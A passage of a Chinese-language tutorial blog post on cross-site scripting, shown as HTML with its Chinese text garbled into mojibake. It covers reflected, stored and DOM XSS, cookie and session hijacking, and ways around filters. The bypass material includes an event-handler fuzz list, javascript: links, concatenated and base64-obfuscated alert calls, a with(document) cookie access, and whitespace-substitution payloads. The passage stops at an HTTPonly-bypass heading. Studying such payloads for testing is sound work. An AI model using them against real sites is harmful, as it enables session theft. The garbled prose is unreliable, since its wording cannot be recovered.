/></p>\n<p>è¿™é‡Œæ’å…¥ jsï¼Œä¾¿å¯æ‰§è¡Œ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221207814.png\" alt=\"image-20221025221207814\" /></p>\n<h3 id=\"å­˜å‚¨å‹\"><a class=\"anchor\" href=\"#å­˜å‚¨å‹\">#</a> å­˜å‚¨å‹</h3>\n<p>è¿˜æ˜¯å…ˆç›—ä¸ªå›¾ï¼ˆæˆ‘å‘å››ï¼Œæœ¬ç¯‡æœ€åä¸€å¼ ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025220126444.png\" alt=\"image-20221025220126444\" /></p>\n<p>åˆšåˆšè¯´åˆ°åå°„å‹ä¹Ÿå«éæŒä¹…æ€§ï¼Œé‚£ä¹ˆå­˜å‚¨å‹å°±æ˜¯æŒä¹…å‹ xssï¼Œä¸ xss çš„åŒºåˆ«å°±æ˜¯æäº¤çš„ xss ä»£ç æ˜¯å¦ä¼šè¢«å­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼Œä¸‹æ¬¡è®¿é—®åˆ°è¿™ä¸ªé¡µé¢æ—¶è¿˜ä¼šæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚ï¼ˆå­˜å‚¨å‹ xss ä¸åœ¨æ˜¯æ”»å‡»è€…è¯±å¯¼å—å®³è€…ç‚¹å‡»è¿æ¥ï¼Œè€Œæ˜¯å°† xss è„šæœ¬ç•™åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå½“å—å®³è€…è®¿é—®äº†å­˜æœ‰ xss è„šæœ¬çš„é¡µé¢æ—¶å°±å—åˆ°äº†æ”»å‡»ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œæ•°æ®å­˜å‚¨çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å­˜åœ¨ xss æ¼æ´ï¼Œè¿™ç§ xss æ”»å‡»æ¯”åå°„å‹å±å®³æ›´å¤§ã€‚ï¼‰</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\necho &quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ¯æ¬¡è®¿é—®æ—¶éƒ½ä¼šæ‰§è¡Œ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221521051.png\" alt=\"image-20221025221521051\" /></p>\n<h3 id=\"domå‹\"><a class=\"anchor\" href=\"#domå‹\">#</a> DOM å‹</h3>\n<p>ä¸ªäººç†è§£å…¶å®ä¹Ÿç®—æ˜¯åå°„å‹ï¼Œä½†æ˜¯ DOM å‹çš„ xss ä¸éœ€è¦ä¸æœåŠ¡ç«¯äº¤äº’ï¼Œä»…ä»…å‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µï¼ŒDOM å…¨ç§° Document Object Modelï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ï¼Œå¯¹äºæµè§ˆå™¨æ¥è¯´ DOM å°±æ˜¯ä¸€ä»½ xmlï¼ŒJavaScript é‡æ„ HTML é¡µé¢çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ DOM æä¾›ç»“æ„åŒ–è¡¨ç¤ºï¼ŒDOM è§„å®š HTML ä¸­æ¯ä¸ªæˆåˆ†éƒ½æ˜¯ä¸€ä¸ªç»“ç‚¹</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">DOMè§„å®šï¼š\næ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£ç»“ç‚¹\næ¯ä¸€ä¸ªHTMLæ ‡ç­¾æ˜¯ä¸€ä¸ªå…ƒç´ ç»“ç‚¹\nåŒ…å«åœ¨HTMLå…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯æ–‡æœ¬ç»“ç‚¹\næ¯ä¸ªHTMLå±æ€§æ˜¯ä¸€ä¸ªå±æ€§ç»“ç‚¹\nç»“ç‚¹ä¸ç»“ç‚¹ä¹‹é—´éƒ½æœ‰ç­‰çº§å…³ç³»<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>HTML DOM æ ‘</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025224329456.png\" alt=\"image-20221025224329456\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">å¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§\ndocument.refererå±æ€§\n\nwindow.nameå±æ€§\n\nlocationå±æ€§\n\ninnerHTMLå±æ€§\n\ndocumen.writeå±æ€§<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"domå‹xssåˆ©ç”¨åŸç†\"><a class=\"anchor\" href=\"#domå‹xssåˆ©ç”¨åŸç†\">#</a> DOM å‹ xss åˆ©ç”¨åŸç†</h4>\n<p>åˆ©ç”¨å‰ææ˜¯ js å¯ä»¥è®¿é—® DOM æ–‡æœ¬å¯¹è±¡æ¨¡å‹ï¼Œå¦‚æœå®¢æˆ·ç«¯ä»£ç ä¸­æœ‰ xss è„šæœ¬è¯±å¯¼ç”¨æˆ·ç‚¹å‡»å¯ä»¥ä½¿å¾—ç”¨æˆ·è®¿é—®è‡ªå·±æ„é€ çš„ urlï¼Œè¾¾åˆ°å’Œåå°„å‹ç±»ä¼¼çš„æ•ˆæœï¼Œå› å…¶ä¸ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡ waf</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\"><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">var</span> tem <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å–å½“å‰é¡µé¢çš„ URL</span>\n    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å– content = åé¢çš„å†…å®¹</span>\n    <span class=\"token keyword\">var</span> par <span class=\"token operator\">=</span> tem<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// è·å–å‚æ•°</span>\n    document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>par<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//decodeURI () è§£ç  // è¾“å‡ºå‚æ•°</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026213845778.png\" alt=\"image-20221026213845778\" /></p>\n<h1 id=\"xssçš„æ£€æµ‹\"><a class=\"anchor\" href=\"#xssçš„æ£€æµ‹\">#</a> Xss çš„æ£€æµ‹</h1>\n<p>æ£€æµ‹ xss ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æ‰‹å·¥æ£€æµ‹ï¼Œä¸€ç§æ˜¯é€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·æ£€æµ‹ï¼Œä¸ªäººæ„Ÿè§‰ä¸¤ç§æ–¹æ³•æ²¡æœ‰å…ˆåå„æœ‰åˆ©å¼Šå§ã€‚æ‰‹å·¥æ£€æµ‹çš„ç²¾åº¦æ›´é«˜ï¼Œä½†æ˜¯å½“ä¸€ä¸ª web åº”ç”¨ç¨‹åºè¿‡äºåºå¤§çš„æƒ…å†µï¼Œæ‰‹å·¥æ£€æµ‹æ˜¯éå¸¸å›°éš¾çš„ï¼Œç”¨å·¥å…·è‡ªåŠ¨åŒ–æ£€æµ‹ç²¾åº¦ç›¸å¯¹è¦ä½ä¸Šä¸å°‘</p>\n<h3 id=\"æ‰‹å·¥æ£€æµ‹xss\"><a class=\"anchor\" href=\"#æ‰‹å·¥æ£€æµ‹xss\">#</a> æ‰‹å·¥æ£€æµ‹ xss</h3>\n<p>æ‰‹å·¥æ£€æµ‹æ—¶ï¼Œä¸»è¦è€ƒè™‘æœ‰è¾“å‡ºå’Œèƒ½å¤Ÿå­˜å‚¨çš„åœ°æ–¹è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ç‰¹å¾æ˜æ˜¾çš„å­—ç¬¦æ¥è¿›è¡Œæµ‹è¯•</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt; &gt; &quot;  &#39; ( )ç­‰å­—ç¬¦<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>åŒæ—¶æºå¸¦ä¸Šå¦‚ AAAAAAA å­—ä¾¿äºæŸ¥æ‰¾æ’å…¥åˆ° HTML ä¸­çš„ä½ç½®</p>\n<h3 id=\"xsså·¥å…·\"><a class=\"anchor\" href=\"#xsså·¥å…·\">#</a> Xss å·¥å…·</h3>\n<p>è¿™é‡Œå·¥å…·å¾ˆå¤šä¸å†ä¸€ä¸€èµ˜è¿°ï¼Œæ¨èå» GitHub ä¸Šå¯»æ‰¾å¼€æºçš„å·¥å…·</p>\n<h1 id=\"xssçš„åˆ©ç”¨ç§ç±»\"><a class=\"anchor\" href=\"#xssçš„åˆ©ç”¨ç§ç±»\">#</a> Xss çš„åˆ©ç”¨ç§ç±»</h1>\n<p>åœ¨ä¸€äº›æƒ…å†µä¸‹ xss æ¼æ´çš„å±å®³ä¸äºšäº sql æ³¨å…¥ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹æ³•ï¼š</p>\n<ul>\n<li>ç›—å–ç”¨æˆ· cookie</li>\n<li>ä¿®æ”¹ç½‘é¡µå†…å®¹</li>\n<li>ç½‘ç«™æŒ‚é©¬</li>\n<li>åˆ©ç”¨ç½‘ç«™é‡å®šå‘</li>\n<li>xss è •è™«</li>\n</ul>\n<h3 id=\"xssä¼šè¯åŠ«æŒ\"><a class=\"anchor\" href=\"#xssä¼šè¯åŠ«æŒ\">#</a> xss ä¼šè¯åŠ«æŒ</h3>\n<p>è¿™é‡Œå¤šæ•°æ˜¯æŒ‡åŠ«æŒ cookie æˆ– session è¾¾åˆ°ç›®çš„</p>\n<h4 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> cookie</h4>\n<p>cookie æ˜¯ä¸€ç§èƒ½å¤Ÿå°†å°‘é‡æ–‡æœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯çš„ç£ç›˜ã€å†…å­˜ä¸Šé¢æˆ–è€…ä»å®¢æˆ·ç«¯çš„å†…å­˜ã€ç£ç›˜ä¸Šé¢è¯»å–çš„ä¸€ç§æŠ€æœ¯</p>\n<p>ä¸€ä½æˆ‘å°Šæ•¬çš„å¸ˆé•¿è¯´è¿‡ï¼Œæ¯ä¸€ç§æŠ€æœ¯æˆ–è€…åè®®çš„äº§ç”Ÿéƒ½æ˜¯ç”±éœ€æ±‚é©±åŠ¨çš„ï¼Œcookie çš„äº§ç”Ÿä¸»è¦æ˜¯ä¸ºäº†è§£å†³ http åè®®çš„æ— çŠ¶æ€ï¼Œweb æœåŠ¡å™¨éœ€è¦é¢å¤–çš„æ•°æ®ç”¨äºç»´æŒä¼šè¯ï¼Œcookie æ­£æ˜¯ä¸€ä¸€æ®µéš http è¯·æ±‚çš„å“åº”çš„é¢å¤–æ•°æ®ï¼Œä»–çš„ä¸»è¦ä½œç”¨æ˜¯æ ‡è¯†ç”¨æˆ·ç»´æŒä¼šè¯</p>\n<p>cookie ä¸»è¦åˆ†ä¸ºæŒä¹… cookie å’ŒéæŒä¹… cookieï¼Œè¿™ä¸¤ç§åˆ†ç±»çš„ä¸»è¦åŒºåˆ«å°±æ˜¯æŒä¹… cookie æ˜¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯çš„ç£ç›˜ä¸­çš„åªæœ‰åˆ°äº†è¿‡æœŸæ—¶é—´æˆ–è€…æ‰‹åŠ¨åˆ é™¤æ‰ä¼šå¤±æ•ˆï¼Œéè¾æ—§ cookie æ˜¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯çš„å†…å­˜ä¸Šçš„ï¼Œæµè§ˆå™¨å…³é—­åå°±ä¼šæ¶ˆå¤±</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">cookieä¸€èˆ¬ä¼šç»è¿‡åŠ å¯†ï¼Œåªæœ‰æœåŠ¡å™¨çš„å¤„ç†ç¨‹åºæ‰çŸ¥é“cookieçš„å«ä¹‰<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>éƒ¨åˆ†å¼€å‘è€…å°† cookie ä½œä¸ºç”¨æˆ·çš„æ ‡è¯†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åŠ«æŒ cookie æ¥ç™»å½•è´¦å·ï¼Œè€Œéƒ¨åˆ†å¼€å‘è€…ä¸ä¼šå°† cookie å½“ä½œç”¨æˆ·çš„æ ‡è¯†ï¼Œè€Œæ˜¯å‚¨å­˜ä¸€äº›ä¸´æ—¶ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¿åˆ° cookie ä¹Ÿæ˜¯æ²¡ç”¨çš„</p>\n<h4 id=\"session\"><a class=\"anchor\" href=\"#session\">#</a> session</h4>\n<p>é™¤å» cookie å¤–ç»´æŒä¼šè¯çš„å¦ä¸€ç§å½¢å¼å°±æ˜¯ sessionï¼Œsession åœ¨ç½‘ç»œåº”ç”¨ä¸­è¢«ç§°ä¸ºä¼šè¯æ˜¯ä¸€ç§æœåŠ¡ç«¯çš„æœºåˆ¶ï¼Œæˆ‘ä»¬æ‰“å¼€ç½‘ç«™åˆ°å…³é—­æµè§ˆå™¨è¿™æ®µæ—¶é—´è¢«ç§°ä¸ºä¼šè¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„ä¼šè¯æ²¡ç»“æŸæ—¶å°±æ‹¿åˆ° session å°±èƒ½åšåˆ°åŠ«æŒä¼šè¯çš„æ•ˆæœ</p>\n<h1 id=\"xssæ¼æ´æ”»ä¸é˜²\"><a class=\"anchor\" href=\"#xssæ¼æ´æ”»ä¸é˜²\">#</a> xss æ¼æ´æ”»ä¸é˜²</h1>\n<p>xss è·¨ç«™è„šæœ¬æ¼æ´çš„æ ¹æœ¬åŸå› è¿˜æ˜¯å¼€å‘è€…å¯¹ç”¨æˆ·çš„è¾“å…¥è¾“å‡ºæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„å®¢æˆ·ç«¯è„šæœ¬è¢«æµè§ˆå™¨æ­£å¸¸æ‰§è¡Œå¯¼è‡´ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†æ•æ„Ÿå­—ç¬¦è¿‡æ»¤å°±èƒ½å¤Ÿä¿®è¡¥ xss æ¼æ´</p>\n<h3 id=\"ç‰¹å®šçš„æ ‡ç­¾è¿‡æ»¤\"><a class=\"anchor\" href=\"#ç‰¹å®šçš„æ ‡ç­¾è¿‡æ»¤\">#</a> ç‰¹å®šçš„æ ‡ç­¾è¿‡æ»¤</h3>\n<p>éƒ¨åˆ†å¼€å‘è€…è®¤ä¸ºå°†å±é™©çš„æ ‡ç­¾è¿‡æ»¤æ‰å°±ä¸ä¼šæ‰§è¡Œ js è„šæœ¬ï¼Œä½†æ˜¯å®é™…ä¸Šä»»ä½•ä¸€ç§æ ‡ç­¾æ— è®ºæ˜¯å¦åˆæ³•éƒ½èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œ js è„šæœ¬</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>not_real_tag onclick<span class=\"token operator\">=</span><span class=\"token string\">\"alert(/xss/)\"</span> <span class=\"token operator\">></span>click me<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>not_real_tag<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>åƒè¿™æ ·æ„é€ ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œ xss è„šæœ¬ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¾“å‡ºç‚¹åœ¨ HTML æ ‡ç­¾ä¸­æˆ–è€… js è„šæœ¬ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„é—­åˆæ‹¼æ¥å±æ€§é‚£ä¹ˆå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ xss</p>\n<h3 id=\"äº‹ä»¶è¿‡æ»¤\"><a class=\"anchor\" href=\"#äº‹ä»¶è¿‡æ»¤\">#</a> äº‹ä»¶è¿‡æ»¤</h3>\n<p>å¾ˆå¤šæ—¶å€™å¼€å‘è€…è€…ä¼šé€‰æ‹©è¿‡æ»¤äº‹ä»¶æ¥é˜²æ­¢ xssï¼Œä½†æ˜¯ä¸æ’é™¤æœ‰æ¼ç½‘ä¹‹é±¼ï¼Œè¿™é‡Œå¯ä»¥ fuzz å°è¯•</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">Fuzzå­—å…¸åˆ†äº«:\nonafterprint\noninput\nonscrol1\nonbeforeprint\noninvalid\nonabort\nonbeforeunload\nonreset\noncanplay\nonerror\nonselect\noncanplaythrough\nonhaschange\nonsubmit\nondurationchange\nonload\nonkeydown\nonemptied\nonmessage\nonkeypress\nonended\nonoffline\nonkeyup\nonerror\nononline\nonclick\nonloadeddata\nonpagehide\nondblclick\nonloadedmetadata\nonpageshow\nondrag\nonloadstart\nonpopstate\nondragend\nonpause\nonredo\nondragenter\nonplay\nonresize\nondragleave\nonplaying\nonstorage\nondragover\nonprogress\nonundo\nondragstart\nonratechange\nonunload\nondrop\nonreadystatechange\nonblur\nonmous edown\nonseeked\nonchange\nonmous emove\nonseeking\noncontextmenu\nonmouseout\nonstalled\nonfocus\nonmouseover\nonsuspend\nonformchange\nonmouseup\nontimeupdate\nonforminput\nonmousewheel\nonvolumechange<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>åŒæ ·è¿˜æœ‰ä¸€äº›ä¸å±äºäº‹ä»¶å±æ€§ï¼Œä½†å¯ä»¥ç”¨äºæ‰§è¡Œ js ä»£ç ï¼Œæ¯”å¦‚å¸¸è§çš„ js ä¼ªåè®®</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>a herf<span class=\"token operator\">=</span><span class=\"token string\">\"javascript:alert(/xss/)\"</span><span class=\"token operator\">></span>click me <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤\"><a class=\"anchor\" href=\"#æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤\">#</a> æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤</h3>\n<p>åœ¨ html ä¸­ï¼Œ&lt;&gt;&quot; å’Œ '&amp; éƒ½æœ‰ç‰¹æ®Šçš„æ„ä¹‰ï¼ŒHTML çš„æ ‡ç­¾å±æ€§å°±æ˜¯ç”±è¿™å‡ ä¸ªå­—ç¬¦ç»„æˆçš„ï¼Œå¦‚æœç›´æ¥è¾“å‡ºå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ª HTML æ–‡æ¡£çš„ç»“æ„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸æƒ…å†µå°†è¿™äº›å­—ç¬¦è½¬ä¹‰ï¼Œæ¯”å¦‚ php æä¾›äº† htmlspeciachars å’Œ htmlentities ä¸¤ä¸ªå‡½æ•°æŠŠä¸€äº›é¢„å®šå­—ç¬¦è½¬ä¹‰è½¬æ¢æˆ HTML å®ä½“</p>\n<ul>\n<li>(&amp;) æˆä¸º &amp; amp</li>\n<li>(&quot;) æˆä¸º &amp; quot</li>\n<li>(') æˆä¸º &amp;#039</li>\n<li>(&lt;) æˆä¸º &amp; lt</li>\n<li>(&gt;) æˆä¸º &amp; gt</li>\n</ul>\n<p>å…³é”®å­—è¿‡æ»¤å…¶å®å¤§éƒ¨åˆ†æ˜¯é’ˆå¯¹æ•æ„Ÿå˜é‡æˆ–è€…å‡½æ•°è¿›è¡Œçš„ï¼Œå¦‚ evalï¼Œcookie ç­‰ï¼Œè¿™éƒ¨åˆ†çš„è¿‡æ»¤å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç¼–ç è§£ç ç­‰æ–¹æ³•ç»•è¿‡</p>\n<h4 id=\"å­—ç¬¦ä¸²æ‹¼æ¥æ··æ·†\"><a class=\"anchor\" href=\"#å­—ç¬¦ä¸²æ‹¼æ¥æ··æ·†\">#</a> å­—ç¬¦ä¸²æ‹¼æ¥æ··æ·†</h4>\n<p>js ä¸­çš„å¯¹è±¡æ–¹æ³•å¯ä»¥é€šè¿‡æ•°ç»„çš„æ–¹å¼è¿›è¡Œè°ƒç”¨ï¼Œæ¯”å¦‚è°ƒç”¨ alert å‡½æ•°</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'alert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿™é‡Œæ•°ç»„çš„ä¸‹æ ‡æ˜¯å…ˆè¦è°ƒç”¨å‡½æ•°åå­—çš„å­—ç¬¦ä¸²ï¼Œæ—¢ç„¶è¯´æ˜¯å­—ç¬¦ä¸²é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>æˆ–è€…é€šè¿‡ js è‡ªå¸¦çš„ base ç¼–ç æ¥å®ç°å­—ç¬¦ä¸²çš„ç»•è¿‡</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token function\">atob</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"YWxl\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"cnQ=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h4 id=\"ç¼–ç è§£ç \"><a class=\"anchor\" href=\"#ç¼–ç è§£ç \">#</a> ç¼–ç è§£ç </h4>\n<p>åŸºäºå­—ç¬¦ä¸²çš„ä»£ç æ··æ·†ä¸ä»…å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥é€šè¿‡å„ç§ç¼–ç çš„æ–¹å¼ï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p>\n<ul>\n<li>HTML è¿›åˆ¶ç¼–ç </li>\n<li>css è¿›åˆ¶ç¼–ç </li>\n<li>js è¿›åˆ¶ç¼–ç </li>\n<li>url ç¼–ç </li>\n<li>jsfuck ç¼–ç ï¼ˆä¸€ç§åªæœ‰<a href=\"\"></a>ï¼+6 ä¸ªå­—ç¬¦æ¥ç¼–å†™ js ç¨‹åºï¼‰</li>\n</ul>\n<h4 id=\"locationwindowname\"><a class=\"anchor\" href=\"#locationwindowname\">#</a> location*,<span class=\"exturl\" data-url=\"aHR0cDovL3dpbmRvdy5uYW1l\">window.name</span></h4>\n<p>æ—¢ç„¶å¼€å‘è€…ä¼šå¯¹è¾“å…¥çš„æ•æ„Ÿå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å°† xss è„šæœ¬æ”¾åˆ°ä¸ä¼šäº¤ä»˜åˆ°æœåŠ¡ç«¯çš„éƒ¨åˆ†</p>\n<h4 id=\"è¿‡æ»¤\"><a class=\"anchor\" href=\"#è¿‡æ»¤\">#</a> è¿‡æ»¤ &quot;.&quot;</h4>\n<p>äº‹ä»¶æ‹¼æ¥éƒ½ç”±ç‚¹ç»„æˆï¼Œå¯ä»¥è¿‡æ»¤ç‚¹æ¥é˜²å¾¡</p>\n<p>ä½†æ˜¯åœ¨ js ä¸­å¯ä»¥ç”¨ with å…³é”®å­—è®¾ç½®å˜é‡çš„ä½œç”¨åŸŸã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥ç»•è¿‡ç‚¹çš„è¿‡æ»¤</p>\n<p>with(document)with(cookie)</p>\n<h4 id=\"è¿‡æ»¤-2\"><a class=\"anchor\" href=\"#è¿‡æ»¤-2\">#</a> è¿‡æ»¤ &quot;()&quot;</h4>\n<p>js è„šæœ¬ä¸­è°ƒç”¨å¯¹è±¡æ–¹æ³•è¦ä½¿ç”¨ (), ä½¿ç”¨ throw å…³é”®å­—ä¼ é€’é˜è¿°å¯ä»¥ç»•è¿‡é™åˆ¶</p>\n<p>window.onerror=alert; throw 1;</p>\n<h4 id=\"è¿‡æ»¤ç©ºæ ¼\"><a class=\"anchor\" href=\"#è¿‡æ»¤ç©ºæ ¼\">#</a> è¿‡æ»¤ç©ºæ ¼</h4>\n<p>åœ¨æ ‡ç­¾å±æ€§é—´å¯ä»¥é€šè¿‡æ¢è¡Œç¬¦ 0x09ã€0x10ã€0x12ã€0x13ã€0x0a ç­‰å­—ç¬¦ä»£æ›¿ç©ºæ ¼ç»•è¿‡è¿‡æ»¤</p>\n<p>&lt;img%0asrc=x%0aonerror=alert(/xss/)&gt;</p>\n<p>åœ¨æ ‡ç­¾åç§°å’Œç¬¬ä¸€ä¸ªå±æ€§é—´ä¹Ÿå¯ä»¥ä½¿ç”¨ &quot;/&quot; ä»£æ›¿ç©ºæ ¼</p>\n<p>&lt;input/onfocus=alert(/xss/)&gt;</p>\n<h3 id=\"httponlyç»•è¿‡\"><a class=\"anchor\" href=\"#httponlyç»•è¿‡\">#</a> HTTPonly ç»•è¿‡</h3>\n<p>HTTPonly æ˜¯ cookie çš„ä¸€ä¸ªå®‰å…¨å±æ€§ï¼Œè®¾ç½®åå¯ä»¥é˜²æ­¢ xss æ¼æ´äº§ç”Ÿçš„æ—¶å€™é¿å… js è„šæœ¬è·å–åˆ° cookie</p>\n<h4 id=\"cve-2012-0053\"><a class=\"anchor\" href=\"#cve-2012-0053\">#</a> 